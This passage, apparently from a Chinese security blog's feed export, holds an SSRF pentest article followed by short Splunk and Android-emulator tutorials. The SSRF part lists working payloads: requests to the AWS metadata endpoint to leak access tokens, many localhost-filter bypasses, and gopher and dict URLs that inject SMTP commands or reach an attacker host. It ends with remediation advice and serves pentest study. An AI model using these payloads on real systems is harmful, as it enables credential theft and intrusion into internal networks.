越来越多的公司将部分基础设施放到亚马逊的EC2服务器上。亚马逊公开内部服务，每台EC实例都能查询主机元数据。这是AWS文档。如果你在EC2上发现了SSRF漏洞，试着请求http://169.254.169.254/latest/meta-data。响应会提供许多有用的信息便于对基础设施有一定的了解，甚至可能会泄漏亚马逊S3的访问token，API token等等。你也可以下载_ http://169.254.169.254/latest/user-data_和解压数据。 1.5、漏洞利用示例： 某度翻译SSRF： 某短网址SSRF： 1.6、Bypass 1.4.1 攻击本地 12http://127.0.0.1:80http://localhost:22 1.4.2利用[::] 123利用[::]绕过localhosthttp://[::]:80/ &gt;&gt;&gt; http://127.0.0.1也有看到利用http://0000::1:80/的，但是我测试未成功 1.4.3利用@ 1http://example.com@127.0.0.1 1.4.4利用短地址 1http://dwz.cn/11SMa &gt;&gt;&gt; http://127.0.0.1 1.4.5利用特殊域名 123利用的原理是DNS解析http://127.0.0.1.xip.io/http://www.owasp.org.127.0.0.1.xip.io/ 1.4.6 利用DNS解析 1域名上设置A记录，指向127.0.1 1.4.7 利用上传 1234也不一定是上传，我也说不清，自己体会 -.-修改&quot;type=file&quot;为&quot;type=url&quot;比如：上传图片处修改上传，将图片文件修改为URL，即可能触发SSRF 例子 1.4.8 利用Enclosed alphanumerics 1234567891011利用Enclosed alphanumericshttp://ⓔⓧⓐⓜⓟⓛⓔ.ⓒⓞⓜ &gt;&gt;&gt; http://example.comList:① ② ③ ④ ⑤ ⑥ ⑦ ⑧ ⑨ ⑩ ⑪ ⑫ ⑬ ⑭ ⑮ ⑯ ⑰ ⑱ ⑲ ⑳ ⑴ ⑵ ⑶ ⑷ ⑸ ⑹ ⑺ ⑻ ⑼ ⑽ ⑾ ⑿ ⒀ ⒁ ⒂ ⒃ ⒄ ⒅ ⒆ ⒇ ⒈ ⒉ ⒊ ⒋ ⒌ ⒍ ⒎ ⒏ ⒐ ⒑ ⒒ ⒓ ⒔ ⒕ ⒖ ⒗ ⒘ ⒙ ⒚ ⒛ ⒜ ⒝ ⒞ ⒟ ⒠ ⒡ ⒢ ⒣ ⒤ ⒥ ⒦ ⒧ ⒨ ⒩ ⒪ ⒫ ⒬ ⒭ ⒮ ⒯ ⒰ ⒱ ⒲ ⒳ ⒴ ⒵ Ⓐ Ⓑ Ⓒ Ⓓ Ⓔ Ⓕ Ⓖ Ⓗ Ⓘ Ⓙ Ⓚ Ⓛ Ⓜ Ⓝ Ⓞ Ⓟ Ⓠ Ⓡ Ⓢ Ⓣ Ⓤ Ⓥ Ⓦ Ⓧ Ⓨ Ⓩ ⓐ ⓑ ⓒ ⓓ ⓔ ⓕ ⓖ ⓗ ⓘ ⓙ ⓚ ⓛ ⓜ ⓝ ⓞ ⓟ ⓠ ⓡ ⓢ ⓣ ⓤ ⓥ ⓦ ⓧ ⓨ ⓩ ⓪ ⓫ ⓬ ⓭ ⓮ ⓯ ⓰ ⓱ ⓲ ⓳ ⓴ ⓵ ⓶ ⓷ ⓸ ⓹ ⓺ ⓻ ⓼ ⓽ ⓾ ⓿ 1.4.9 利用句号 1http://127。0。0。1 &gt;&gt;&gt; http://127.0.0.1 1.4.10 利用进制转换 – IP进制转换地址：转换地址 1234567891011121314151617181920可以是十六进制，八进制等。115.239.210.26 &gt;&gt;&gt; 16373751032首先把这四段数字给分别转成16进制，结果：73 ef d2 1a然后把 73efd21a 这十六进制一起转换成8进制记得访问的时候加0表示使用八进制(可以是一个0也可以是多个0 跟XSS中多加几个0来绕过过滤一样)，十六进制加0xIP转换为-16进制-记得访问的时候加0X表示使用16进制http://127.0.01 &gt;&gt;&gt; http://7F000001 &gt;&gt;&gt;http://0X7F000001IP转换为-16进制-转换为八进制-记得访问的时候加0表示使用八进制http://127.0.01 &gt;&gt;&gt; http://7F000001 &gt;&gt;&gt;http://17700000001&gt;&gt;&gt;http://017700000001127转换为8进制：http://127.0.0.1 &gt;&gt;&gt; http://0177.0.0.1/ip地址转换为10进制：http://127.0.0.1 &gt;&gt;&gt; http://2130706433/http://192.168.0.1 &gt;&gt;&gt; http://3232235521/http://192.168.1.1 &gt;&gt;&gt; http://3232235777/ 1.4.11 利用特殊地址 1http://0/ 1.4.12 利用协议 1234567891011Dict://dict://&lt;user-auth&gt;@&lt;host&gt;:&lt;port&gt;/d:&lt;word&gt;ssrf.php?url=dict://attacker:11111/SFTP://ssrf.php?url=sftp://example.com:11111/TFTP://ssrf.php?url=tftp://example.com:12346/TESTUDPPACKETLDAP://ssrf.php?url=ldap://localhost:11211/%0astats%0aquitGopher://ssrf.php?url=gopher://127.0.0.1:25/xHELO%20localhost%250d%250aMAIL%20FROM%3A%3Chacker@site.com%3E%250d%250aRCPT%20TO%3A%3Cvictim@site.com%3E%250d%250aDATA%250d%250aFrom%3A%20%5BHacker%5D%20%3Chacker@site.com%3E%250d%250aTo%3A%20%3Cvictime@site.com%3E%250d%250aDate%3A%20Tue%2C%2015%20Sep%202017%2017%3A20%3A26%20-0400%250d%250aSubject%3A%20AH%20AH%20AH%250d%250a%250d%250aYou%20didn%27t%20say%20the%20magic%20word%20%21%250d%250a%250d%250a%250d%250a.%250d%250aQUIT%250d%250a 1.4.13 使用组合 各种绕过进行自由组合即可 参考链接： 12345678910https://www.hackerone.com/blog-How-To-Server-Side-Request-Forgery-SSRFhttps://twitter.com/albinowax/status/890725759861403648http://blog.safebuff.com/2016/07/03/SSRF-Tips/https://hackerone.com/reports/115748https://www.dailysecurity.fr/server-side-request-forgery/https://twitter.com/EdOverflowhttps://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/SSRF%20injectionhttp://www.agarri.fr/docs/AppSecEU15-Server_side_browsing_considered_harmful.pdfhttp://byd.dropsec.xyz/2017/06/04/SSRF%E6%BC%8F%E6%B4%9E%E5%89%96%E6%9E%90%E4%B8%8E%E5%88%A9%E7%94%A8/http://blog.csdn.net/xinianbuxiu/article/details/53560417 1.7 SSRF危害 主机本地敏感信息读取， 对外网、服务器所在内网、本地进行端口扫描，获取一些服务的Banner信息。 攻击运行在内外网主机的应用程序。 通过访问默认文件对内网 Web 应用进行指纹识别。 攻击内外网的 Web 应用，主要是使用 GET参数就可以实现的攻击。 利用file协议读取本地文件。 1.8 漏洞修复 禁止302跳转 过滤返回信息，验证远程服务器对请求的响应是比较容易的方法。如果web应用是去获取某一种类型的文件。那么在把返回结果展示给用户之前先验证返回的信息是否符合标准。 禁用不需要的协议，仅仅允许http和https请求。可以防止类似于file://, gopher://, ftp:// 等引起的问题 设置URL白名单或者限制内网IP（使用gethostbyname()判断是否为内网IP） 限制请求的端口为http常用的端口，比如 80、443、8080、8090 统一错误信息，避免用户可以根据错误信息来判断远端服务器的端口状态。]]></content>
      <categories>
        <category>WEB安全</category>
      </categories>
      <tags>
        <tag>WEB渗透测试</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[日志分析神器_Splunk]]></title>
    <url>%2F2019%2F06%2F12%2F%E5%BA%94%E6%80%A5-%E6%97%A5%E5%BF%97%E5%88%86%E6%9E%90%E7%A5%9E%E5%99%A8_Splunk%2F</url>
    <content type="text"><![CDATA[0x01安装 搭建系统环境 16.04.1-Ubuntu-64 Splunk splunk-7.3.0-657388c7a488-Linux-x86_64 下载解压（想要安装包请留言），如下图所示： 解压完后，cd到splunk/bin目录下启动，然后需要输入web登录的账户和密码，成功如下图所示： 1运行命令:sudo ./splunk start 查看虚拟机IP，在本地浏览器访问，输入自己设置的账户和密码即可： 0x02日志分析 载入需要分析的日志，一直下一步即可，注意修改下主机字段值，方便查找，最后点击提交即可： 0x03分析案例0x03.1 Splunk 名词说明12345678910Data Input : 添加数据 （文件或文件目录、TCP、UDP、WMI、Script, Forwarder…）Source type ： 来源类型 （apache logs, security log、network log…）Host ：主机 （apache1、apche2, apcahe3…) Source：数据源 （/opt/apache/log/*.*）Index：索引（Splunk 索引）Field：字段： 正则表达式 (Regular Expression) 取出符合某个条件字段Search Language：搜索语句 （缩小范围 -&gt; 计算 -&gt; 呈现 ）Saved Search： 搜索语句储存，未来可以直接使用Report ： 報表，搜索结果 -&gt; 图形报表Alert：告警，搜索结果通报 0x03.2 案例案例一：统计-top 分析状态码为200、攻击者前10的IP地址，如下图所示：]]></content>
      <categories>
        <category>应急响应</category>
      </categories>
      <tags>
        <tag>应急响应</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[Mac下使用夜神模拟器调试]]></title>
    <url>%2F2018%2F12%2F19%2FAPP%E6%B5%8B%E8%AF%95-Mac%E4%B8%8B%E4%BD%BF%E7%94%A8%E5%A4%9C%E7%A5%9E%E6%A8%A1%E6%8B%9F%E5%99%A8%E8%B0%83%E8%AF%95%2F</url>
    <content type="text"><![CDATA[1、遇到的问题：1.1、描述： 首先去夜神官网下载mac版最新app，吐槽一下，内置应用很不爽，那么Mac使用夜神模拟器调试，遇到adb无法连接夜神模拟器，怎么办？ 1.2、解决： 使用adb devices命令会发现，没有此设备，添加设备，网上有很多方法，主要是将usb文件号加入adb_usb.ini中，不赘述。再次运行adb devices，发现还是找不到设备，使用了一个取巧的办法，夜神模拟器的服务默认监听在62001端口，所以使用adb connect 127.0.0.1:62001 通过adb connect命令利用TCP/IP协议来连接。 进入设备]]></content>
      <categories>
        <category>APP</category>
      </categories>
      <tags>
        <tag>APP渗透测试</tag>
      </tags>
  </entry>
</search>
